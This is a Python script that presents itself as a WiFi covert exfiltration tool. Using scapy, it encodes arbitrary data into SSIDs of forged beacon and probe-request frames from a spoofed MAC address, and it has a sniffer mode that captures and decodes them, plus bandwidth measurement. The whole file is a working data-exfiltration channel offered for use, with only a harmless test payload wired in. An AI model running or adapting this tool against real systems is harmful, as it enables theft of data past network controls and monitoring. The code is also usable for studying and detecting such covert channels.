#!/usr/bin/env python3
"""WiFi Covert Exfiltration Tool — demonstrates data exfil via WiFi side channels."""

import subprocess
import sys
import time
import json
import struct
import hashlib

try:
    from scapy.all import (
        RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11ProbeReq,
        sendp, sniff, conf
    )
except ImportError:
    sys.exit("scapy required: pip install scapy")


def encode_data_to_ssids(data, chunk_size=28):
    """Encode arbitrary bytes into a sequence of SSID-safe strings."""
    encoded = data.hex()
    chunks = [encoded[i:i + chunk_size] for i in range(0, len(encoded), chunk_size)]
    ssids = []
    for idx, chunk in enumerate(chunks):
        header = f"{idx:02x}{len(chunks):02x}"
        ssids.append(header + chunk)
    return ssids


def decode_ssids_to_data(ssids):
    """Decode captured SSIDs back to original data."""
    ordered = {}
    for ssid in ssids:
        if len(ssid) < 4:
            continue
        try:
            idx = int(ssid[:2], 16)
            payload = ssid[4:]
            ordered[idx] = payload
        except ValueError:
            continue
    hex_data = "".join(ordered[k] for k in sorted(ordered.keys()))
    return bytes.fromhex(hex_data)


def send_data_beacons(interface, data, channel=1, delay=0.1):
    """Exfiltrate data by sending it encoded in beacon SSIDs."""
    ssids = encode_data_to_ssids(data)
    checksum = hashlib.md5(data).hexdigest()[:8]
    print(f"[*] Sending {len(ssids)} beacon frames (checksum: {checksum})")
    set_channel(interface, channel)

    for ssid_str in ssids:
        mac = "de:ad:be:ef:ca:fe"
        dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff",
                      addr2=mac, addr3=mac)
        beacon = Dot11Beacon(cap="ESS")
        essid = Dot11Elt(ID="SSID", info=ssid_str.encode(), len=len(ssid_str))
        pkt = RadioTap() / dot11 / beacon / essid
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(delay)
    print(f"[+] Exfil complete — {len(data)} bytes in {len(ssids)} frames")


def send_data_probes(interface, data, channel=1, delay=0.1):
    """Exfiltrate data via probe request SSIDs."""
    ssids = encode_data_to_ssids(data)
    set_channel(interface, channel)
    for ssid_str in ssids:
        mac = "de:ad:be:ef:ca:fe"
        dot11 = Dot11(type=0, subtype=4, addr1="ff:ff:ff:ff:ff:ff",
                      addr2=mac, addr3="ff:ff:ff:ff:ff:ff")
        probe = Dot11ProbeReq()
        essid = Dot11Elt(ID="SSID", info=ssid_str.encode(), len=len(ssid_str))
        pkt = RadioTap() / dot11 / probe / essid
        sendp(pkt, iface=interface, verbose=False)
        time.sleep(delay)


def capture_exfil_channel(interface, src_mac="de:ad:be:ef:ca:fe",
                          channel=1, duration=60):
    """Listen for covert exfil beacons from a known source MAC."""
    set_channel(interface, channel)
    captured_ssids = []

    def handler(pkt):
        if pkt.haslayer(Dot11Beacon):
            if pkt[Dot11].addr2 == src_mac:
                ssid_elt = pkt.getlayer(Dot11Elt)
                if ssid_elt and ssid_elt.info:
                    captured_ssids.append(ssid_elt.info.decode(errors="replace"))

    print(f"[*] Listening for exfil on channel {channel} from {src_mac}")
    sniff(iface=interface, prn=handler, timeout=duration, store=False)
    return captured_ssids


def measure_bandwidth(data_size, frame_count, duration):
    """Calculate covert channel bandwidth."""
    bps = (data_size * 8) / max(duration, 0.1)
    return {"bits_per_second": round(bps, 1),
            "bytes_transferred": data_size,
            "frames_used": frame_count,
            "duration_sec": round(duration, 1)}


def set_channel(interface, channel):
    subprocess.run(["iwconfig", interface, "channel", str(channel)],
                   capture_output=True)


def export_results(results, path="exfil_results.json"):
    with open(path, "w") as f:
        json.dump(results, f, indent=2)
    print(f"[+] Results exported to {path}")


if __name__ == "__main__":
    print("WiFi Covert Exfiltration Tool — companion to the web dashboard")
    print("Usage: sudo python3 wifi_tool.py <interface> [send|recv]")
    if len(sys.argv) > 1:
        iface = sys.argv[1]
        mode = sys.argv[2] if len(sys.argv) > 2 else "recv"
        if mode == "send":
            test_data = b"COVERT_TEST_PAYLOAD_1234567890"
            send_data_beacons(iface, test_data)
        else:
            ssids = capture_exfil_channel(iface, duration=30)
            print(f"[+] Captured {len(ssids)} encoded SSIDs")
